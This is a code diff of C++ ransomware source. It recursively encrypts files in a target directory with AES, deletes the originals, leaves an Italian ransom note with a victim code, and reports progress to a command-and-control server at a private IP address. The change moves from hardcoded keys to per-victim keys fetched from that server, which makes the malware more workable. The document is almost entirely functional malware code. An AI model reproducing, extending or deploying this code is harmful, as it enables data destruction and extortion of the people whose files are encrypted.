@@ -8,11 +8,7 @@
 
 namespace fs = std::filesystem;
 
-// KEY = IV = 12345678123456781234567812345678
-static const uint8_t KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78 };
-static const uint8_t IV[] = { 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78 };
-
-static const std::string C2APIURL = "http://10.211.55.2:8080/api/track"; // "http://10.211.55.2:8080/api/track"
+static const std::string C2APIURL = "http://10.211.55.2:8080/api/track";
 
 int totalFiles = 0;
 
@@ -21,11 +17,11 @@ void handleErrors() {
     abort();
 }
 
-void encryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath) {
+void encryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath, const std::vector<unsigned char>& key, const std::vector<unsigned char>& iv) {
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     if (!ctx) handleErrors();
 
-    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, KEY, IV)) {
+    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key.data(), iv.data())) {
         handleErrors();
     }
 
@@ -59,31 +55,47 @@ void encryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath) 
     EVP_CIPHER_CTX_free(ctx);
 }
 
-void processFilesInDirectory(const fs::path& directoryPath) {
+void processFilesInDirectory(const fs::path& directoryPath, const std::vector<unsigned char>& key, const std::vector<unsigned char>& iv) {
     for (const auto& entry : fs::directory_iterator(directoryPath)) {
         if(entry.is_directory()) {
-            processFilesInDirectory(entry.path());
+            processFilesInDirectory(entry.path(), key, iv);
         } else if (entry.is_regular_file() && entry.path().filename().string().find(".") != 0) {
             fs::path inputFilePath = entry.path();
             fs::path encryptedFilePath = inputFilePath;
             encryptedFilePath += ".enc";
 
-            encryptFile(inputFilePath, encryptedFilePath);
+            encryptFile(inputFilePath, encryptedFilePath, key, iv);
             fs::remove(inputFilePath);
             totalFiles++;
         }
     }
 }
 
-void writeReadme(const fs::path& directoryPath) {
+void writeReadme(const fs::path& directoryPath, std::string uuid) {
     fs::path outputFilePath = fs::path(directoryPath) / "__README.txt";
 
     std::ofstream outFile(outputFilePath);
     if (outFile.is_open()) {
         outFile << "Il contenuto di questa cartella è stato cifrato.\n";
-        outFile << "Per riavere i tuoi file indietro devi pagare un riscatto.\n";
+        outFile << "Per recuperare i file comunica il seguente codice: " << uuid << std::endl;
         outFile.close();
     }
+}
+
+std::vector<unsigned char> base64Decode(const std::string& base64Data) {
+    BIO* bio = BIO_new_mem_buf(base64Data.c_str(), -1);
+    BIO* b64 = BIO_new(BIO_f_base64());
+    bio = BIO_push(b64, bio);
+
+    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
+
+    std::vector<unsigned char> decodedData(base64Data.length());
+    int decodedLength = BIO_read(bio, decodedData.data(), base64Data.length());
+
+    BIO_free_all(bio);
+
+    decodedData.resize(decodedLength);
+    return decodedData;
 }
 
 int main() {
@@ -113,21 +125,33 @@ int main() {
 
     std::string uuid = result["uuid"];
     std::string directory = result["directory"];
+    std::string base64Key = result["key"];
+    std::string base64Iv = result["iv"];
 
-	if (uuid == "" || directory == "") {
+	if (uuid == "" || directory == "" || base64Key == "" || base64Iv == "") {
 		return 1;
 	}
 
+    std::vector<unsigned char> key = base64Decode(base64Key);
+    if (key.size() != 16) {
+        return 1;
+    }
+
+    const std::vector<unsigned char>& iv = base64Decode(base64Iv);
+    if (iv.size() != 16) {
+        return 1;
+    }
+
     try {
-        processFilesInDirectory(directoryPath + "/" + directory);
-        writeReadme(directoryPath + "/" + directory);
+        processFilesInDirectory(directoryPath + "/" + directory, key, iv);
+        writeReadme(directoryPath + "/" + directory, uuid);
     }
     catch (const std::exception& e) {
 		c2.sendError(uuid, e.what());
         return 1;        
     }
 
-    c2.sendEnd(uuid, totalFiles);
+    c2.sendEnd(uuid, totalFiles, directoryPath + "/" + directory);
 
     return 0;
 }
